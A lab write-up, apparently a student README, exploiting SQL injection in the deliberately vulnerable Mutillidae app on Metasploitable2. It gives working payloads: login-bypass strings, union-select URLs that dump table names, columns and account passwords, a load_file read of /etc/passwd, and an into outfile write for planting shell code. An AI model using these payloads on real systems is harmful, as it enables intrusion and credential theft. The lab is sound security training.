# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. Identify IP address using ifconfig in Metasploitable2

![image](https://github.com/SubashiniSenniappan/sqlinjection/assets/119404951/c81fef4a-938b-4bdf-9c23-e104d7b1ffad)
 Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.

![image](https://github.com/SubashiniSenniappan/sqlinjection/assets/119404951/5494a8c0-cec1-4847-9cf0-f194785927ad)
Select Multidae from the menu listed as shown above. You will get the page as displayed below:

![image](https://github.com/SubashiniSenniappan/sqlinjection/assets/119404951/86936942-087b-4f21-9c13-ddeb2a133b89)


Click on the menu Login/Register and register for an account

![image](https://github.com/SubashiniSenniappan/sqlinjection/assets/119404951/d297f251-74a8-452f-861a-97ecc724c481)


Click on the link “Please register here” ![image](https://github.com/SubashiniSenniappan/sqlinjection/assets/119404951/8244528e-84e9-4294-acb1-63c41a3430e8)


Click on “Create Account” to display the following page:![image](https://github.com/SubashiniSenniappan/sqlinjection/assets/119404951/1344dffe-9aeb-466e-a780-9da0b413e023)
The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.

![image](https://github.com/SubashiniSenniappan/sqlinjection/assets/119404951/004e989f-0074-4c48-89d0-cbf5b5f6f813)
Click “Login”. The logged in page will show as below:

## Bypassing login field
The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.

![image](https://github.com/SubashiniSenniappan/sqlinjection/assets/119404951/4bf7db00-1f0c-4f34-a50d-7957377614bf)
 Click the login button and you will see it enter into the administrator page.

![image](https://github.com/SubashiniSenniappan/sqlinjection/assets/119404951/e3fef065-eb8e-44d2-a232-0591b8a2b9dd)


## Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info”

After logging out, Now choose the menu as shown below:

![image](https://github.com/SubashiniSenniappan/sqlinjection/assets/119404951/d3bea6f5-fa4e-4a32-8979-d9f1b2aea8cb)
![image](https://github.com/SubashiniSenniappan/sqlinjection/assets/119404951/8892ed34-df73-4445-abd0-4b6630b1c9ad)
![image](https://github.com/SubashiniSenniappan/sqlinjection/assets/119404951/514f7f9e-b96e-474a-bed0-9792dab5452a)
![image](https://github.com/SubashiniSenniappan/sqlinjection/assets/119404951/98b5b24e-41a7-4b3f-ba06-630eef4382b5)


From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned. 

Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:
http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=subashini%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details


![image](https://github.com/SubashiniSenniappan/sqlinjection/assets/119404951/89be207a-cd0c-46f0-b8e6-1cdb3f682154)

 After adding the order by 6 into the existing url , the following error statement will be obtained:

![image](https://github.com/SubashiniSenniappan/sqlinjection/assets/119404951/8c947fc8-f057-452e-a571-5db925a5179f)
 When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.

![image](https://github.com/SubashiniSenniappan/sqlinjection/assets/119404951/8ab47a29-c7b9-4918-98ea-d68cbd4951ee)


As it is having 5 columns the query worked fine and it provides the correct result

![image](https://github.com/SubashiniSenniappan/sqlinjection/assets/119404951/491312d1-e1dc-4ae5-8fdf-0fb1abb1c5c1)
 Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)

![image](https://github.com/SubashiniSenniappan/sqlinjection/assets/119404951/d052812b-3784-45e0-b2d3-f55a188a470a)
 As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.
Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=subashini%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details

Screenshot 2023-06-10 225314 The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=subashini%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/SubashiniSenniappan/sqlinjection/assets/119404951/178e4812-dd95-48e6-ab42-8394266b1434)


The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.

![image](https://github.com/SubashiniSenniappan/sqlinjection/assets/119404951/0ca107a6-69fb-42df-b3fa-7a78fccd59b8)


The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=subashini%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/SubashiniSenniappan/sqlinjection/assets/119404951/47d3ca57-2374-41c4-9dd0-9d829d68e1e0)


Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=subashini%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/SubashiniSenniappan/sqlinjection/assets/119404951/67ca4bfe-5e9c-452d-8aca-cf712c0533a5)


## Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=subashini%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details ![image](https://github.com/SubashiniSenniappan/sqlinjection/assets/119404951/f6ebd6e5-e492-4382-a520-395ea814f1e6)
the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).

## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
